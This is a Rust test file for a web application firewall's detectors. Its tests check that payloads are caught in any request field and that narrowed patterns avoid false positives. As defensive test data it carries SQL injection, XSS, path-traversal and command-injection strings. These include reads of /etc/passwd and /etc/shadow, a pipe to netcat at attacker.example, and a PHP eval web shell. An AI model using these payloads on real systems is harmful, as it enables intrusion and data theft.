//! Detector behaviour through the public surface.
//!
//! Two things are asserted here that the inherited implementation got wrong, and
//! both are security properties rather than tuning preferences:
//!
//! 1. **A payload is judged by its bytes, not by which field carried them.** The
//!    reference shipped four private "safe header" skip-lists covering
//!    `user-agent`, `content-type`, `host` and `referer`, so the same SQL injection
//!    was caught in a query string and missed in a User-Agent.
//! 2. **The narrowed patterns still catch what they are for.** Five patterns
//!    produced most of the measured 35.4% false-positive rate. Narrowing them is
//!    only progress if recall survives, so each has a benign case that must not
//!    fire and a malicious case that must.

use pingap_waf::config::{RawMode, WafConfig};
use pingap_waf::{
    Category, Paranoia, RequestInput, ResponseInput, RuleEngine, detectors,
};

/// An engine with every category enforcing and a threshold of 1, so any single hit
/// is visible as a block. Tuning is not what these tests are about.
///
/// Paranoia is a parameter rather than a constant because it changes which patterns
/// participate, and that is a behaviour worth asserting rather than papering over:
/// the noisy patterns are *supposed* to fire at raised paranoia. A test pinned to
/// `MAX` would report the deliberately-noisy level as a defect.
fn engine_at(paranoia: u8) -> RuleEngine {
    let cfg = WafConfig {
        categories: Category::ALL
            .iter()
            .map(|c| {
                let mode = if c.is_response_side() {
                    RawMode::Redact
                } else {
                    RawMode::Block
                };
                (c.key().to_string(), mode)
            })
            .collect(),
        anomaly_threshold: 1,
        paranoia: Paranoia::new(paranoia).expect("1..=4"),
        // Generous on purpose. The engine checks its time budget *between* rules and
        // stops when it runs out, and rules are evaluated in category order — so a
        // budget that expires mid-ruleset silently starves whichever categories sit
        // last. In a debug build under parallel tests
        // the 10 ms default is reachable, and a test that failed for that reason would
        // look like a missing detection.
        budget_ms: 10_000,
        ..Default::default()
    };
    RuleEngine::build(
        cfg.validate().expect("test config is valid"),
        detectors::request_rules(),
        detectors::response_rules(),
    )
    .expect("native ruleset builds")
}

/// The shipped default. Most assertions belong here, because this is what an
/// operator who changes nothing runs.
fn engine() -> RuleEngine {
    engine_at(1)
}

fn request<'a>(
    uri: &'a str,
    headers: &'a [(&'a str, &'a str)],
    query: &'a [(&'a str, &'a str)],
    body: Option<&'a [u8]>,
) -> RequestInput<'a> {
    RequestInput {
        method: "GET",
        uri,
        headers,
        query,
        body,
        client_ip: None,
        body_truncated: false,
    }
}

/// Categories that fired, so an assertion can name what it expected instead of
/// just "something matched".
fn categories_hit(
    e: &pingap_waf::Evaluation<pingap_waf::RequestVerdict>,
) -> Vec<Category> {
    let mut v: Vec<Category> =
        e.verdict.hits().iter().map(|h| h.category).collect();
    v.sort_by_key(|c| c.crs_group());
    v.dedup();
    v
}

fn hit_as_query(engine: &RuleEngine, payload: &str) -> Vec<Category> {
    let query = [("q", payload)];
    categories_hit(&engine.evaluate_request(&request("/s", &[], &query, None)))
}

fn hit_as_user_agent(engine: &RuleEngine, payload: &str) -> Vec<Category> {
    let headers = [("user-agent", payload)];
    categories_hit(&engine.evaluate_request(&request(
        "/s",
        &headers,
        &[],
        None,
    )))
}

#[test]
fn a_payload_is_judged_by_its_bytes_not_by_the_field_that_carried_it() {
    let engine = engine();
    // One case per detector family that previously kept a private skip-list. The
    // reference caught each of these in a query value and missed all four in a
    // User-Agent, which is a bypass rather than a tuning choice: User-Agent is a
    // standard injection vector.
    let cases = [
        (
            "Mozilla/5.0 (X11) ' UNION SELECT password FROM users --",
            Category::SqlInjection,
        ),
        ("Mozilla/5.0 <script>alert(1)</script>", Category::Xss),
        (
            "Mozilla/5.0 ../../../etc/passwd",
            Category::LocalFileInclusion,
        ),
        (
            "Mozilla/5.0 ; cat /etc/shadow",
            Category::RemoteCodeExecution,
        ),
    ];
    for (payload, expected) in cases {
        let as_query = hit_as_query(&engine, payload);
        let as_header = hit_as_user_agent(&engine, payload);
        assert!(
            as_query.contains(&expected),
            "`{payload}` must be caught as a query value; got {as_query:?}"
        );
        assert!(
            as_header.contains(&expected),
            "`{payload}` must be caught as a User-Agent too; got {as_header:?}"
        );
    }
}

#[test]
fn every_inspectable_field_is_reached() {
    let engine = engine();
    let payload = "' UNION SELECT password FROM users --";
    // URI, query value, header value, and body. A field that is silently not
    // inspected is a bypass that no pattern fix can close.
    let uri = format!("/search?q={payload}");
    for (label, input) in [
        ("uri", request(&uri, &[], &[], None)),
        ("query", request("/s", &[], &[("q", payload)], None)),
        ("header", request("/s", &[("x-note", payload)], &[], None)),
        ("body", request("/s", &[], &[], Some(payload.as_bytes()))),
    ] {
        let hits = categories_hit(&engine.evaluate_request(&input));
        assert!(
            hits.contains(&Category::SqlInjection),
            "{label} was not inspected; got {hits:?}"
        );
    }
}

#[test]
fn a_percent_encoded_payload_is_decoded_before_matching() {
    let engine = engine();
    // Encoding is the cheapest possible bypass, so it has to be closed at the
    // field level rather than per pattern.
    let hits =
        hit_as_query(&engine, "%27%20UNION%20SELECT%20pw%20FROM%20u%20--");
    assert!(
        hits.contains(&Category::SqlInjection),
        "percent-encoded SQLi must be decoded first; got {hits:?}"
    );
    // Double encoding decodes once to `%2e%2e%2f`, which the encoded-variant
    // traversal patterns are there to catch.
    let hits = hit_as_query(&engine, "%252e%252e%252fetc%252fpasswd");
    assert!(
        hits.contains(&Category::LocalFileInclusion),
        "double-encoded traversal must still be caught; got {hits:?}"
    );
}

#[test]
fn the_five_noisy_patterns_no_longer_fire_on_their_benign_cases() {
    // At the **default** paranoia, which is the claim being made: these strings do
    // not trip the shipped profile. Some of them deliberately do fire at paranoia 3,
    // where an operator has asked for the noisier patterns — see the corpus gate,
    // which records that trade as 0.0000 → 0.0643 false positives for 0.9940 →
    // 1.0000 recall.
    let engine = engine();
    // Each string is drawn from the measured false-positive sources. Together
    // these five accounted for most of the 0.3536 baseline.
    let benign = [
        // `(?i)0x[0-9a-f]{2,}` fired on hex colours, git SHAs and ETags.
        "color: #000000; border: 1px solid 0xAABBCC",
        "0xdeadbeefcafe1234567890abcdef1234567890ab",
        // `--[^\r\n]*$` fired on em-dash prose and every CLI flag string.
        "inconclusive -- see appendix B",
        "npm run build -- --mode=production",
        "cargo test -- --nocapture",
        // `;\s*\w` fired on every Content-Type with a charset.
        "text/html; charset=utf-8",
        "application/json; charset=UTF-8",
        // `\|\s*\w` fired on any pipe-delimited value.
        "name|email|created_at",
        // Keyword pairs fired on ordinary English.
        "Please select from the following options",
        "Insert into the slot at the top",
        "Delete from your cart before checkout",
        "Drop the table linens off at the cleaners",
        "The union representative and select committee met",
    ];
    for case in benign {
        let hits = hit_as_query(&engine, case);
        assert!(hits.is_empty(), "benign string `{case}` tripped {hits:?}");
    }
}

#[test]
fn narrowing_those_patterns_did_not_cost_their_true_positives() {
    let engine = engine();
    // The same five shapes, in the SQL-syntactic context that makes them attacks.
    // Buying precision by dropping recall is not an improvement, so each benign
    // case above is paired with one of these.
    let malicious = [
        ("id=0x414141 UNION SELECT 1", Category::SqlInjection),
        ("1' OR '1'='1' --", Category::SqlInjection),
        ("admin'--", Category::SqlInjection),
        ("1; DROP TABLE users", Category::SqlInjection),
        (
            "1 UNION SELECT username, password FROM users",
            Category::SqlInjection,
        ),
        (
            "ping 127.0.0.1; cat /etc/passwd",
            Category::RemoteCodeExecution,
        ),
        (
            "file.txt | nc attacker.example 4444",
            Category::RemoteCodeExecution,
        ),
    ];
    for (case, expected) in malicious {
        let hits = hit_as_query(&engine, case);
        assert!(
            hits.contains(&expected),
            "malicious string `{case}` must still be caught by {expected}; got {hits:?}"
        );
    }
}

#[test]
fn no_category_carries_a_client_fingerprint_rule() {
    // Bot verdicts moved out of the WAF into `pingap-bot`, and this is what keeps them
    // from drifting back. While both subsystems matched User-Agents, a scraper could be
    // refused by the WAF with an anomaly score attached — a score is a thing an
    // injection payload has and a scraper does not, so the two answers were not even
    // comparable. One bot-policy surface, and the WAF is not it.
    let engine = engine();
    let clients = [
        "sqlmap/1.7-dev",
        "Nikto/2.5.0",
        "gobuster/3.6",
        "python-requests/2.31.0",
        "curl/8.5.0",
        "Go-http-client/2.0",
        "Scrapy/2.11",
        "SemrushBot/7~bl",
    ];
    for level in 1..=4 {
        let engine = engine_at(level);
        for ua in clients {
            let hits = hit_as_user_agent(&engine, ua);
            assert!(
                hits.is_empty(),
                "`{ua}` produced WAF hits {hits:?} at paranoia {level}; a \
                 self-declared client name is the bot plugin's decision"
            );
        }
    }

    // A browser must also be clean, at every level — the same assertion the moved
    // detector carried, kept because it is the one an unusable bot list fails.
    let firefox =
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0";
    for level in 1..=4 {
        assert!(hit_as_user_agent(&engine_at(level), firefox).is_empty());
    }

    // And the header is still inspected for real payloads, so removing the fingerprint
    // rules did not also close the header blindspot the detector port was meant to fix.
    assert!(
        hit_as_user_agent(
            &engine,
            "Mozilla/5.0 ' UNION SELECT pw FROM users --"
        )
        .contains(&Category::SqlInjection),
        "a SQL injection carried in a User-Agent must still be caught"
    );
}

#[test]
fn response_side_detectors_score_their_own_lineages() {
    let engine = engine();
    let cases: [(&str, Category); 4] = [
        // 950 data leakage: a database error disclosing internals, and a
        // credential-shaped string.
        (
            "Warning: mysql_connect(): Access denied for user 'root'@'localhost'",
            Category::DataLeakage,
        ),
        (
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEow...",
            Category::DataLeakage,
        ),
        // 955 web shells: the output signatures of a planted shell.
        ("<?php eval($_POST['cmd']); ?>", Category::WebShell),
        ("uid=0(root) gid=0(root) groups=0(root)", Category::WebShell),
    ];
    for (body, expected) in cases {
        let e = engine.evaluate_response(&ResponseInput {
            status: 200,
            headers: &[("content-type", "text/html")],
            body_chunk: Some(body.as_bytes()),
            request_score: 0,
            body_truncated: false,
        });
        let hits: Vec<Category> =
            e.verdict.hits().iter().map(|h| h.category).collect();
        assert!(
            hits.contains(&expected),
            "response body `{body}` must be caught by {expected}; got {hits:?}"
        );
        assert!(
            e.verdict.is_enforcing(),
            "a response-side hit at threshold 1 must redact"
        );
    }
}

#[test]
fn a_benign_response_body_is_left_alone() {
    let engine = engine();
    let body = br#"{"items":[{"id":1,"name":"widget"}],"total":1}"#;
    let e = engine.evaluate_response(&ResponseInput {
        status: 200,
        headers: &[("content-type", "application/json")],
        body_chunk: Some(body),
        request_score: 0,
        body_truncated: false,
    });
    assert!(
        !e.verdict.is_enforcing(),
        "benign JSON was redacted: {:?}",
        e.verdict.hits()
    );
}

#[test]
fn request_side_rules_never_appear_on_the_response_path() {
    let engine = engine();
    // A SQLi payload echoed in a response body is not a response-side finding.
    // Scoring it there would double-count the same attack and make the response
    // score meaningless.
    let e = engine.evaluate_response(&ResponseInput {
        status: 200,
        headers: &[],
        body_chunk: Some(b"' UNION SELECT password FROM users --"),
        request_score: 0,
        body_truncated: false,
    });
    for h in e.verdict.hits() {
        assert!(
            h.category.is_response_side(),
            "{} scored on the response path",
            h.category
        );
    }
}

#[test]
fn every_native_rule_id_belongs_to_its_own_category() {
    // The ID scheme is what makes a log line traceable to a rule; a detector
    // assigned an ID outside its category's range silently mislabels every hit it
    // produces.
    let engine = engine();
    assert!(
        engine.request_rule_count() > 0 && engine.response_rule_count() > 0,
        "both surfaces must carry native rules"
    );
    for (id, category) in detectors::native_rule_ids() {
        assert!(
            category.owns_id(id.get()),
            "{id} is outside {category}'s range {:?}",
            category.id_range()
        );
        assert!(!id.is_custom(), "{id} sits in the reserved custom range");
    }
}

#[test]
fn native_rule_ids_are_unique() {
    let mut ids: Vec<u32> = detectors::native_rule_ids()
        .into_iter()
        .map(|(id, _)| id.get())
        .collect();
    let before = ids.len();
    ids.sort_unstable();
    ids.dedup();
    assert_eq!(before, ids.len(), "two native rules share an ID");
}
